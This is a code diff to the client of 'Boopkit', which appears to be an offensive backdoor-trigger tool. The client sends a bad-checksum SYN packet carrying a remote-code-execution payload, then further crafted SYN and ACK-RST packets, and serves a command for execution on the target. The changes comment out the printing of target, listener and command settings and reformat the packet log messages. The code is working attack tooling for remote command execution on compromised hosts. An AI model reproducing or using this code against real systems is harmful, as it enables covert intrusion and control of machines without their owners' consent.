@@ -143,7 +143,7 @@ int serverce(char listenstr[INET_ADDRSTRLEN], char *rce) {
     boopprintf(" XX Socket bind failure: %s\n", listenstr);
     return 1;
   }
-  boopprintf("LISTEN   [serving exec] <- %s:%s\n", cfg.lhost, cfg.lport);
+  //boopprintf("LISTEN   [serving exec] <- %s:%s\n", cfg.lhost, cfg.lport);
   // boopprintf("Listening for Boopkit response...\n");
   //  n=1 is the number of clients to accept before we begin refusing clients!
   if (listen(servesock, 1) < 0) {
@@ -178,11 +178,11 @@ int main(int argc, char **argv) {
   asciiheader();
   rootcheck(argc, argv);
   srand(time(NULL));
-  boopprintf("RHOST     : %s\n", cfg.rhost);
-  boopprintf("RPORT     : %s\n", cfg.rport);
-  boopprintf("LHOST     : %s\n", cfg.lhost);
-  boopprintf("LPORT     : %s\n", cfg.lport);
-  boopprintf("RCE EXEC  : %s\n", cfg.rce);
+//  boopprintf("RHOST     : %s\n", cfg.rhost);
+//  boopprintf("RPORT     : %s\n", cfg.rport);
+//  boopprintf("LHOST     : %s\n", cfg.lhost);
+//  boopprintf("LPORT     : %s\n", cfg.lport);
+//  boopprintf("RCE EXEC  : %s\n", cfg.rce);
 
   // [Destination]
   // Configure daddr fields sin_port, sin_addr, sin_family
@@ -250,8 +250,7 @@ int main(int argc, char **argv) {
     boopprintf("Unable to send bad checksum SYN packet over SOCK_RAW.\n");
     return 2;
   }
-  boopprintf("SYN      [bad checksum] -> %s:%s %d bytes\n", cfg.rhost,
-             cfg.rport, sent);
+  boopprintf("  -> [%d  bytes]   TX SYN     : %s:%s (RCE payload, *bad checksum)\n", sent, cfg.rhost, cfg.rport);
   close(sock1);
   // ===========================================================================
 
@@ -277,7 +276,7 @@ int main(int argc, char **argv) {
     boopprintf("Connection SOCK_STREAM refused.\n");
     return 2;
   }
-  boopprintf("CONNECT  [    okay    ] -> %s:%s\n", cfg.rhost, cfg.rport);
+  boopprintf("  -> [handshake]   CONN       : %s:%s\n", cfg.rhost, cfg.rport);
   close(sock2);
   // ===========================================================================
 
@@ -309,16 +308,14 @@ int main(int argc, char **argv) {
     boopprintf("Unable to send RST over SOCK_STREAM.\n");
     return 2;
   }
-  boopprintf("SYN      [    okay    ] -> %d bytes to %s:%s\n", sent, cfg.rhost,
-             cfg.rport);
+  boopprintf("  -> [%d  bytes]   TX SYN     : %s:%s\n", sent, cfg.rhost, cfg.rport);
   char recvbuf[DATAGRAM_LEN];
   int received = receive_from(sock3, recvbuf, sizeof(recvbuf), &saddr);
   if (received <= 0) {
     boopprintf("Unable to receive SYN-ACK over SOCK_STREAM.\n");
     return 3;
   }
-  boopprintf("SYN-ACK  [    okay    ] <- %d bytes from %s\n", received,
-             cfg.rhost);
+  boopprintf("  <- [%d  bytes]   RX SYN-ACK : %s:%s (RCE payload)\n", received, cfg.rhost, cfg.rport);
   uint32_t seq_num, ack_num;
   read_seq_and_ack(recvbuf, &seq_num, &ack_num);
   int new_seq_num = seq_num + 1;
@@ -329,8 +326,7 @@ int main(int argc, char **argv) {
     boopprintf("Unable to send ACK-RST over SOCK_STREAM.\n");
     return 2;
   }
-  boopprintf("ACK-RST  [    okay    ] -> %d bytes to %s:%s\n", sent, cfg.rhost,
-             cfg.rport);
+  boopprintf("  -> [%d  bytes]   TX ACK-RST : %s:%s\n", sent, cfg.rhost, cfg.rport);
   close(sock3);
   // ===========================================================================
 
@@ -340,7 +336,6 @@ int main(int argc, char **argv) {
     if (errno != 0) {
       boopprintf(" Error serving RCE!\n");
     }
-    boopprintf("EXEC  -> [%s]\n", cfg.rce);
   }
   return 0;
 }
